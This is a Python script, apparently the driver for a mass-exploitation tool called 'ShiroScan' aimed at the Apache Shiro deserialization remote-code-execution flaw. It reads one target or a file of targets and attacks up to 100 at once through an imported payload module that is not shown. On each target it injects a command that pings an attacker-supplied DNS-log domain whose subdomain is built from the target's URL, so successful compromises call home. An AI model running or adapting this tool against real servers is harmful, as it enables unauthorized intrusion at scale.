# -*- coding: utf-8 -*-
# 
import sys
import base64
from moule.main import scripts

banner='''
 ____  _     _          ____                  
/ ___|| |__ (_)_ __ ___/ ___|  ___ __ _ _ __  
\___ \| '_ \| | '__/ _ \___ \ / __/ _` | '_ \ 
 ___) | | | | | | | (_) |__) | (_| (_| | | | |
|____/|_| |_|_|_|  \___/____/ \___\__,_|_| |_|

                           By 斯文
'''


from urllib.parse import urlparse

import base64

def url_encode(url):
    """将字符串进行 base64 编码"""
    # 将字符串编码为 bytes 类型
    bytes_string = url.encode('utf-8')
    # 进行 base64 编码
    encoded_string = base64.b64encode(bytes_string)
    # 将 bytes 类型转换为字符串类型
    encoded_url = encoded_string.decode('utf-8')
    print(encoded_url)
    
    result = ""
    for char in encoded_url:
        if char.isupper():
            result += "_"+char 
        else:
            result += char
    result = result.replace("=","-")
    return result

def url_decode(s):
    result = ""
    i = 0
    while i < len(s):
        if s[i] == "_":
            result += s[i+1].upper()
            i += 2
        else:
            result += s[i]
            i += 1
    result = result.replace("-","=")
    print(result)
    bytes_string = result.encode('utf-8')
    # 进行 base64 解码
    decoded_bytes = base64.b64decode(bytes_string)
    # 将 bytes 类型转换为字符串类型
    return decoded_bytes.decode('utf-8')


print(banner)
print('Welcome To Shiro反序列化 RCE ! \n')

def shiro_scan(url):
        try:
            encoded_url = url_encode(url)
            print(encoded_url)
            print(url_decode(encoded_url))
            command = f"ping {encoded_url}.{sys.argv[2]}"
            scripts(url, command)
        except BaseException:
            pass

if ".txt" in sys.argv[1]:
    f = open(sys.argv[1])
    targets = [i.strip() for i in f.readlines()]
    f.close()
    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=100) as t:
        for i in targets:
            t.submit(shiro_scan,i)  

else:
    shiro_scan(sys.argv[1])